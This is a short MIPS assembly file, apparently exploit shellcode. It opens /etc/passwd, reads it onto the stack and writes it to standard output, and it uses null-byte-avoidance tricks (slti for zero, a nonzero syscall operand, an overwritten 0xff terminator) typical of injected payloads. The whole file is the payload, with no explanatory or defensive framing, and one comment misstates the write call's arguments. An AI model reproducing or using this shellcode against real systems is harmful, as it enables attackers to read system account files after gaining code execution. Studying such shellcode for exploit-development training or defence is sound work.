.section .text
.global __start

__start:
	# open("/etc/passwd", O_RDONLY = 0)
	
	li $t1, 0x2f657463 # /etc
	li $t3, 0x2f706173 # /pas
	li $t4, 0x737764ff # swd

	sw $t1, -0x10($sp)
	sw $t3, -0xc($sp)
	sw $t4, -0x8($sp)

	slti $a1, $zero, -1
	sb $a1, -0x5($sp)

	la $a0, -0x10($sp)

	li $v0, 4005
	syscall 0x040505

	sw $v0, -0x4($sp)

	# read(fd, sp, 0x8080)

	sub $a1, $sp, 0x8080
	lw $a0, -0x4($sp)
	li $a2, 0x8080

	li $v0, 4003
	syscall 0x040505

	sw $v0, -0x4($sp)

	# write(1, sp, 0x400)

	slti $a0, $zero, 0x1337
	lw $a2, -0x4($sp)

	li $v0, 4004
	syscall 0x040505

	# exit(0) 
	
	slti $a0, $zero, -1
	li $v0, 4001
	syscall 0x040505
